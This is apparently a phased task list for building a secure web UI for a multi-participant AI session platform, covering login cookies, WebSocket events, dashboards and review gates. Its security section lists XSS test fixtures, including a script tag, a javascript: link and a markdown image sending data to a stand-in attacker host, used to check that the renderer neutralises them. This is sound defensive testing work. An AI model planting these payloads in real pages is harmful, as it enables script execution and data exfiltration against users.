# Tasks: Phase 2 Web UI

**Branch**: `011-web-ui` | **Spec**: [spec.md](./spec.md) | **Plan**: [plan.md](./plan.md)
**Generated**: 2026-04-20

Execution order below is the recommended sequence. User-story phases are independently testable — after Phase 2 is complete, Phase 3 (US1) ships a shippable MVP.

---

## Phase 1 — Setup

- [ ] T001 Create empty package at `src/web_ui/__init__.py` so imports work.
- [ ] T002 [P] Create `frontend/` directory with an empty `index.html` placeholder at `frontend/index.html`.
- [ ] T003 Update `Dockerfile` to COPY `frontend/` and expose port 8751 in addition to 8750.
- [ ] T004 Update `docker-compose.yml` to publish port 8751.
- [ ] T005 [P] Update entrypoint in `Dockerfile` CMD to launch both uvicorn apps (MCP on 8750, Web UI on 8751) via a small shell wrapper or dual `--host/--port` invocation.
- [ ] T006 [P] Add a new test file at `tests/test_web_ui_app.py` that imports (stubbed) `create_web_app` and asserts the module loads without error.

---

## Phase 2 — Foundational (blocks all user stories)

### Backend app skeleton

- [ ] T010 Create `src/web_ui/app.py` with a `create_web_app()` factory that returns a FastAPI instance, shares `state.pool`/`state.session_repo`/`state.participant_repo`/`state.conversation_loop`/`state.connection_manager` with the Phase 1 app via a shared lifespan / dependency injection helper (extract the Phase 1 shared-resources block from `src/mcp_server/app.py` into `src/web_ui/shared.py` if needed).
- [ ] T011 Add strict security-header middleware in `src/web_ui/app.py`: `Content-Security-Policy` (no inline, no data: images, frame-ancestors none), `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, `Permissions-Policy: camera=(), microphone=()`, `Cache-Control: no-store`.
- [ ] T012 Configure CORS in `src/web_ui/app.py` to own-origin only (no wildcard).
- [ ] T013 [P] Implement `POST /login` in `src/web_ui/auth.py`: accepts `{token}` body, calls Phase 1 `auth_service.validate_token(token, request.client.host)`, sets HttpOnly+Secure+SameSite=Strict cookie named `sacp_ui_token` bound to `(participant_id, session_id, expiry)`.
- [ ] T014 [P] Implement `POST /logout` in `src/web_ui/auth.py`: clears cookie.
- [ ] T015 Implement cookie-based `get_current_ui_participant` dependency in `src/web_ui/auth.py` mirroring the MCP app's bearer-token guard.
- [ ] T016 Add `X-SACP-Request: 1` header check to all mutating routes (CSRF defense).

### WebSocket plumbing

- [ ] T020 Implement `/ws/{session_id}` endpoint in `src/web_ui/websocket.py`: upgrade, validate cookie, confirm participant is in session, register `WebUIConnection` with the shared `ConnectionManager`.
- [ ] T021 Implement the event schema dataclasses in `src/web_ui/events.py` matching [contracts/websocket-events.md](./contracts/websocket-events.md) with `v: 1` on every payload.
- [ ] T022 Implement `_build_state_snapshot(session_id, participant_id)` in `src/web_ui/events.py` that reads session row, participant list, last 50 messages, pending drafts, open proposals, latest summary, last 50 convergence scores, and returns a single snapshot dict.
- [ ] T023 Extend `ConnectionManager` in `src/mcp_server/connection_manager.py` so Phase 1 broadcast sites also push to Web-UI subscribers. Subscriber adapter: translate existing SSE turn events into the v1 event shapes defined in T021.
- [ ] T024 Hook `_broadcast_turn` in `src/mcp_server/tools/session.py` (already sends SSE events) to also fan out `message` events to web-UI subscribers via the adapter from T023.
- [ ] T025 Add `participant_update`, `convergence_update`, `review_gate_staged`, `review_gate_resolved`, `summary_created`, `session_status_changed` broadcast calls at the respective Phase 1 write sites (repositories + loop).
- [ ] T026 Implement client `ping` handling in the WS endpoint (responds `pong`), drop connections whose last pong is older than 60s.
- [ ] T027 Implement WS close codes 4401 / 4403 / 4429 per [contracts/websocket-events.md](./contracts/websocket-events.md).

### Static file serving

- [ ] T030 Mount `frontend/` as static files under `/` in `create_web_app()`. `index.html` serves as SPA fall-through for unknown paths.
- [ ] T031 [P] Write the base `frontend/index.html`: CDN script tags with **SRI hashes** for React 18.3.1, ReactDOM 18.3.1, Babel Standalone 7.25.x, marked 15.x, DOMPurify 3.x; single `<div id="root">`; `<script type="text/babel" src="app.jsx"></script>`.
- [ ] T032 [P] Stub `frontend/app.jsx` with a root component that renders "Hello SACP" to verify CSP + SRI chain.

### Foundation verification

- [ ] T040 Write `tests/test_web_ui_app.py` tests: app factory returns FastAPI, security headers present on `/healthz`, CORS rejects cross-origin, cookie is HttpOnly+Secure+SameSite=Strict.
- [ ] T041 Write `tests/test_web_ui_websocket.py` tests: WS upgrade without cookie → 4401; upgrade with valid cookie but wrong session → 4403; valid cookie + session → receives `state_snapshot` within 1s.

---

## Phase 3 — User Story 1 (P1): Facilitator Creates and Monitors a Session

**Goal**: A facilitator can log in with a bearer token, see the live transcript and participant list, inject messages, pause/resume the loop, add participants.

**Independent test**: Log in as a facilitator with a fresh session containing 2 AI participants + 1 human message. Assert (1) SessionView renders within 2s, (2) a Ctrl+Enter injection produces a new turn in the transcript within 5s, (3) clicking Pause shows the session status badge flip to "paused" within 1s.

- [ ] T050 [US1] Build `frontend/components/AuthGate.jsx`: token input, `POST /login`, redirect to `/session/<session_id>` on success, error banner on failure.
- [ ] T051 [US1] Build the three-column shell in `frontend/components/SessionView.jsx`: header (session name, status, turn counter, connection indicator), left sidebar, center column, right sidebar (placeholders for now).
- [ ] T052 [US1] Build `frontend/components/ParticipantList.jsx`: renders cards from `participants` state, role badges, routing mode pill.
- [ ] T053 [US1] Build `frontend/components/Transcript.jsx`: markdown render pipeline via `marked` + DOMPurify hardening (actual security overrides live in Phase 6/US8; this phase renders plain markdown safely).
- [ ] T054 [US1] Build `frontend/components/MessageInput.jsx`: textarea with Ctrl+Enter send → `POST /tools/participant/inject_message`. Optimistic render with rollback on failure.
- [ ] T055 [US1] Build `frontend/components/SessionControls.jsx`: Pause / Resume / Start Loop / Stop Loop / Archive buttons, facilitator-gated. Each hits the matching Phase 1 endpoint.
- [ ] T056 [US1] Build `frontend/components/AddParticipantDialog.jsx`: facilitator modal; calls `POST /tools/facilitator/add_participant` with validation matching PR #66 placeholder rejection.
- [ ] T057 [US1] Wire `SessionView` to subscribe to the WebSocket at mount, hydrate state from `state_snapshot`, apply `message` / `session_status_changed` / `participant_update` deltas.
- [X] T058 [US1] Add `tests/e2e/test_us1_facilitator_flow.py` Playwright script covering the independent-test criteria above.

**Checkpoint**: Phase 3 alone constitutes a shippable MVP. Everything below is additive.

---

## Phase 4 — User Story 2 (P1): Participant Observes and Interjects

**Goal**: A non-facilitator participant can log in, see the same live view, inject messages, and change their own routing preference, but cannot access facilitator-only controls.

**Independent test**: Log in as a non-facilitator participant. Assert "Add participant", "Pause loop", "Invite", and "pause scope toggle" controls are not in the DOM. Inject a message and confirm it lands in the transcript. Change routing preference and confirm the next turn respects it.

- [ ] T070 [US2] Gate facilitator controls in `SessionControls.jsx`, `AddParticipantDialog.jsx`, and the right-sidebar admin widgets behind a `useRole()` hook that reads `me.role` from state.
- [ ] T071 [US2] Build `frontend/components/SelfControls.jsx`: "My routing preference" selector (8 options from Phase 1 Literal), "My prompt tier" display (read-only), "My budget utilization" bar.
- [ ] T072 [US2] Wire routing-preference changes to `POST /tools/facilitator/set_routing_preference` (facilitator-only endpoint — non-facilitator call falls back to a grayed UI until a self-serve endpoint lands; Phase 2c task T250 addresses gap).
- [ ] T073 [US2] Add role-driven filtering to `state.participants` render so a pending participant's card shows a pending badge but no controls.
- [ ] T074 [US2] Add `tests/e2e/test_us2_participant_view.py` Playwright test covering the hidden-controls assertion.

---

## Phase 5 — User Story 3 (P1): Real-Time WebSocket Streaming

**Goal**: The UI maintains a resilient WebSocket with auto-reconnect + snapshot resync on every connect.

**Independent test**: Open the UI; kill the backend (`docker compose restart sacp`); assert the UI shows "reconnecting" within 5s, successfully reconnects within 30s, and renders the latest turn that happened during downtime via the fresh `state_snapshot`.

- [ ] T080 [US3] Build `frontend/websocketClient.js` (imported by app.jsx): connect → subscribe → dispatch events to reducer; exponential backoff 1s→2s→4s→8s→16s capped 30s; honors close codes 4401/4403/4429.
- [ ] T081 [US3] Build the state reducer in `frontend/store.js`: handles every event type from [contracts/websocket-events.md](./contracts/websocket-events.md), merges deltas into the normalized shape from [data-model.md](./data-model.md).
- [ ] T082 [US3] Implement ping/pong heartbeat every 30s on the client; mark `ws_state = "reconnecting"` when 2 pings go unanswered.
- [ ] T083 [US3] Surface `ws_state` in the header connection indicator (green/yellow/red dot) from `SessionView.jsx`.
- [ ] T084 [US3] Handle the 4401 close: clear UI state, redirect to AuthGate with an "Your session expired — please log in again" banner.
- [ ] T085 [US3] Add `tests/e2e/test_us3_websocket_reconnect.py` Playwright test — uses a network-drop simulator (Playwright's `page.context().setOffline(true)`) to exercise reconnect.

---

## Phase 6 — User Story 8 (P1): Secure Content Rendering

**Goal**: Every rendered message is safe against XSS, image-based exfiltration, javascript: links, and invisible-Unicode context poisoning.

**Independent test**: Inject fixtures `<script>alert(1)</script>`, `![x](https://evil.example/p?d=s)`, `[click](javascript:alert(1))`, and a string with zero-width spaces. Assert (1) no alert fires, (2) the image is replaced with `[Image: x]`, (3) the javascript link is rendered as a warning span, (4) ZWS markers are visible in the rendered DOM.

- [ ] T090 [US8] Harden the marked renderer in `frontend/components/Transcript.jsx`: set `renderer.image`, `renderer.link`, `renderer.html` to neutralized replacements.
- [ ] T091 [US8] Pipe marked output through DOMPurify with a strict allowlist (no `script`, no `iframe`, no `object`, no `embed`, no `on*` attrs, no `javascript:`, no `data:` URIs).
- [ ] T092 [US8] Post-render walker that replaces zero-width spaces / RTL overrides with visible `[ZWS]` / `[RLO]` markers and a count badge on the message header.
- [ ] T093 [US8] Verify CSP blocks inline scripts: pen-test the UI in Phase 6 by injecting a `<script>` via the API and confirming browser console shows a CSP violation, not execution.
- [ ] T094 [US8] Add `tests/e2e/test_us8_xss_vectors.py` Playwright suite covering all four fixtures above.

---

## Phase 7 — User Story 4 (P2): Budget and Convergence Dashboard

**Goal**: Right-sidebar panels show per-participant budget utilization and convergence sparkline.

**Independent test**: Set budget_daily=$0.50 on a participant, run 3 turns, assert budget bar shows ~60% utilization with color escalation. Assert convergence sparkline has 3 data points with a threshold line at 0.85.

- [ ] T100 [US4] Build `frontend/components/BudgetPanel.jsx`: cards per participant, utilization bar, colored gradient (green→yellow→red at 50%/80%/95%), dollar amounts only for self + facilitator view.
- [ ] T101 [US4] Build `frontend/components/ConvergencePanel.jsx`: inline SVG sparkline of last 50 `convergence_scores`, horizontal threshold line at 0.85, tooltip showing turn + score.
- [ ] T102 [US4] Wire the panels to state; both refresh on `participant_update` / `convergence_update` events without full re-render.
- [ ] T103 [US4] Add `tests/e2e/test_us4_dashboard.py` Playwright test.

---

## Phase 8 — User Story 5 (P2): Review Gate Draft Approval

**Goal**: Drafts appear in a queue with approve / edit / reject buttons and a countdown.

**Independent test**: Set a participant to `review_gate` routing. Trigger a turn. Assert draft appears in queue within 2s. Approve → draft content enters transcript with correct speaker attribution. Edit → modified content enters transcript. Reject → draft disappears, no transcript change. Let one draft time out → auto-removed from queue.

- [ ] T110 [US5] Build `frontend/components/ReviewGateQueue.jsx`: renders `pending_drafts`, each with expand/collapse, action buttons, countdown based on `expires_at`.
- [ ] T111 [US5] Build `frontend/components/ReviewGateEditor.jsx`: modal with textarea pre-filled with `draft_content`, Save button calls `POST /tools/facilitator/edit_draft`.
- [ ] T112 [US5] Wire Approve → `POST /tools/facilitator/approve_draft`; Reject → `POST /tools/facilitator/reject_draft`; both optimistic-update the queue.
- [ ] T113 [US5] Handle `review_gate_staged` / `review_gate_resolved` WS events to keep the queue in sync across clients.
- [ ] T114 [US5] Add pause-scope toggle (session vs participant) to the queue header for the facilitator → `POST /tools/facilitator/set_review_gate_pause_scope` (fulfills FR-019).
- [ ] T115 [US5] Add `tests/e2e/test_us5_review_gate.py` Playwright test.

---

## Phase 9 — User Story 6 (P2): Facilitator Admin Panel

**Goal**: Collapsible left-sidebar panel with pending approvals, session config editor, invite generator, audit log.

**Independent test**: A pending participant exists. Open admin panel. Click Approve → participant becomes active and appears in the participant list. Click "Generate invite" → copyable link appears. Open audit log → see the approval action logged within 2s.

- [ ] T120 [US6] Build `frontend/components/AdminPanel.jsx`: collapsible container, four sections (pending, config, invites, audit).
- [ ] T121 [US6] Pending-approvals section: list of pending participants + Approve / Reject buttons. Wired to `POST /tools/facilitator/{approve,reject}_participant`.
- [ ] T122 [US6] Invite generator: button → `POST /tools/facilitator/create_invite` → shows copyable URL; copy-to-clipboard button.
- [ ] T123 [US6] Session config editor: editable fields for cadence preset, convergence threshold, acceptance mode. (Note: Phase 1 endpoints for these toggles partially exist; if a field has no endpoint yet, grey it out and flag a backend gap task in T250.)
- [ ] T124 [US6] Audit log view: polls `GET /tools/debug/export` for `logs.audit` every 15s (WS doesn't currently push audit events; add as gap in T250 if needed).
- [ ] T125 [US6] Add transfer-facilitator action → `POST /tools/facilitator/transfer_facilitator` with a confirm-dialog.
- [ ] T126 [US6] Add `tests/e2e/test_us6_admin_panel.py` Playwright test.

---

## Phase 10 — User Story 9 (P2): Summary Viewer

**Goal**: A right-sidebar panel renders the latest structured summarization checkpoint.

**Independent test**: Run a session past the summary threshold (10 turns). Open Summary panel. Assert decisions / open questions / key positions / narrative sections all render with data.

- [ ] T130 [US9] Build `frontend/components/SummaryPanel.jsx`: four expandable sections (Decisions, Open Questions, Key Positions, Narrative) rendering `latest_summary` from state.
- [ ] T131 [US9] Seed `latest_summary` on connect from `state_snapshot`; update on `summary_created` WS events.
- [ ] T132 [US9] Fall back to `GET /tools/session/summary` if the WS event is missing (e.g., reconnect edge case).
- [ ] T133 [US9] Show placeholder "No checkpoint yet — summaries run every 10 turns" when `latest_summary == null`.
- [ ] T134 [US9] Add `tests/e2e/test_us9_summary.py` Playwright test.

---

## Phase 11 — User Story 10 (P2): Participant Health Indicators

**Goal**: Each participant card shows derived health state with a distinct "breaker tripped" indicator.

**Independent test**: Use `POST /tools/facilitator/debug_set_timeouts` to set a participant's consecutive_timeouts to 2. Assert card shows `warning` badge. Push it to 3 (breaker auto-pauses). Assert card shows `breaker-tripped` badge with count "3". Hover to see the last 3 skip reasons from recent routing_log entries.

- [ ] T140 [US10] Extend `ParticipantList.jsx` (from T052) to derive `ParticipantHealth` per the rules in [data-model.md](./data-model.md) and render the appropriate badge.
- [ ] T141 [US10] Build a tooltip on the health badge showing recent skip reasons. Source: `logs.routing` from `GET /tools/debug/export` filtered to `action='skipped'` for that participant, last 3 entries.
- [ ] T142 [US10] Subscribe to `participant_update` events so health state re-derives in real time.
- [ ] T143 [US10] Add `tests/e2e/test_us10_health.py` Playwright test.

---

## Phase 12 — User Story 7 (P3): Proposal and Decision Tracking

**Goal**: Participants can create proposals, vote, and see resolution.

**Independent test**: Participant A creates proposal "Ship feature X?". Participant B votes Accept. Assert tally shows 1/2 Accept. A votes Accept. Assert proposal resolves as Accepted and collapses to a summary line.

- [ ] T150 [US7] **Backend gap**: add `POST /tools/proposal/create`, `POST /tools/proposal/vote`, `POST /tools/proposal/resolve`, `GET /tools/proposal/list` endpoints in `src/mcp_server/tools/` that wrap the existing `ProposalRepository`. This is a Phase 2c prerequisite, not strictly a UI task, but must land in this PR.
- [ ] T151 [US7] Build `frontend/components/ProposalTracker.jsx`: list of open proposals with vote buttons, tally display, resolve-on-unanimous logic (delegated to backend).
- [ ] T152 [US7] Build `frontend/components/ProposalCreator.jsx`: dialog for creating a proposal (topic + position fields).
- [ ] T153 [US7] Wire to WS events: add `proposal_created`, `proposal_voted`, `proposal_resolved` events to [contracts/websocket-events.md](./contracts/websocket-events.md) as a v1 addition; update backend broadcasts.
- [ ] T154 [US7] Add `tests/e2e/test_us7_proposals.py` Playwright test.

---

## Phase 13 — Polish & Cross-Cutting

- [ ] T200 [P] Responsive CSS: sidebars collapse to drawers below 1024px (FR-008). `frontend/style.css`.
- [ ] T201 [P] Dark theme default; light-theme class toggle in header (spec Assumption).
- [ ] T202 [P] Session export buttons in header → `GET /tools/session/{export_markdown,export_json}` → browser download (FR-017).
- [ ] T203 [P] Accessibility pass: tab order, ARIA roles on panels, keyboard shortcut hints. Track blockers in `docs/accessibility-phase2.md`.
- [ ] T204 [P] Add SRI hash generation script at `scripts/generate_sri_hashes.sh` that fetches pinned CDN assets and outputs `integrity` attribute values.
- [ ] T205 [P] Manual security checklist from `quickstart.md` run through once; log results in PR description.
- [x] ~~T210 Update `SYSREP.md`~~ — Obsolete: SYSREP.md was retired in chore/doc-cleanup; CLAUDE.md "Recent Changes" supersedes it.
- [x] ~~T211 Update `CLAUDE.md`~~ — Obsolete: CLAUDE.md was untracked from the repo (see chore/untrack-files); local-only file going forward, no in-repo bookkeeping required.
- [ ] T212 Bump Docker image, deploy to staging, run full manual checklist, open PR for merge to `main`.

---

## Cross-Cutting Gaps (tracked as T250 group)

Gaps flagged during task generation that need backend work **before** the corresponding UI tasks can fully ship. These are tracked in one bucket to surface at planning time:

- [ ] T250 **Self-serve routing-preference endpoint**: Phase 1 `set_routing_preference` is facilitator-only (PR #61-62). T072 needs a participant-scoped variant like `POST /tools/participant/set_routing_preference` that updates only the caller's own row. Small backend task; add to T072 or ship as a prerequisite fix PR.
- [ ] T251 **Session config mutation endpoints**: Several admin-panel fields in T123 (cadence preset, convergence threshold, acceptance mode) have no dedicated endpoint yet. Add as `POST /tools/facilitator/set_session_config` or individual endpoints. Backend work before T123 is fully functional.
- [ ] T252 **Audit log WS push**: `admin_audit_log` writes today are not broadcast. Add a `audit_entry` WS event at each `log_admin_action` call site so T124 doesn't need to poll.

---

## Dependencies

```
Setup (1) → Foundational (2) → US1 (3) ┐
                               ├→ US2 (4)
                               ├→ US3 (5)       Phase 2a
                               └→ US8 (6)
                                                ─────────
                                  US4 (7)
                                  US5 (8)       Phase 2b
                                  US6 (9)
                                  US9 (10)
                                  US10 (11)
                                                ─────────
                                  US7 (12)      Phase 2c (depends on T150)
                                                ─────────
                                  Polish (13)
```

**Phase 2a ship-readiness**: T001–T094 complete.
**Phase 2b ship-readiness**: + T100–T143.
**Phase 2c ship-readiness**: + T150–T154.
**Final PR**: + T200–T212.

---

## Parallel Execution Opportunities

Within a phase, tasks marked `[P]` touch different files and can run in parallel:

- Phase 1: T002, T005, T006 alongside T001/T003/T004.
- Phase 2: T013 + T014 (different endpoints in the same file — sequential if touching the same file, parallel otherwise); T031 + T032 parallel with backend tasks.
- Phase 3 (US1): T050–T057 are each a new component file; if two developers are available, T052 (ParticipantList) and T053 (Transcript) can run in parallel.
- Phase 4 (US2): T070–T073 each touch distinct components; mostly parallel.
- Phase 6 (US8): T090 + T091 touch the same file (sequential); T092 + T094 parallel.
- Phase 13 polish: all [P] tasks are parallel.

---

## Implementation Strategy

**MVP (ship-first target)**: Phase 1 + Phase 2 + Phase 3 (US1). Delivers facilitator-usable web UI for a single role in one session, with WebSocket live updates. Estimated effort: 1–2 week sprint.

**Iteration 2a**: Add Phase 4 (US2 — participant view) + Phase 5 (US3 — resilient WebSocket) + Phase 6 (US8 — security hardening). This is the full Phase 2a from the spec's internal phasing.

**Iteration 2b**: Phases 7–11 (US4, US5, US6, US9, US10 — dashboards, review gate, admin panel, summary viewer, health indicators). Depends on T250/T251/T252 backend gaps landing first.

**Iteration 2c**: Phase 12 (US7 — proposals) + Phase 13 polish. Depends on T150 backend endpoints.

**Ship cadence**: open draft PR after Phase 1+2 complete; land to `main` after Phase 3 (MVP). Subsequent phases ship as separate PRs stacked off `011-web-ui` or merged back via follow-up branches.
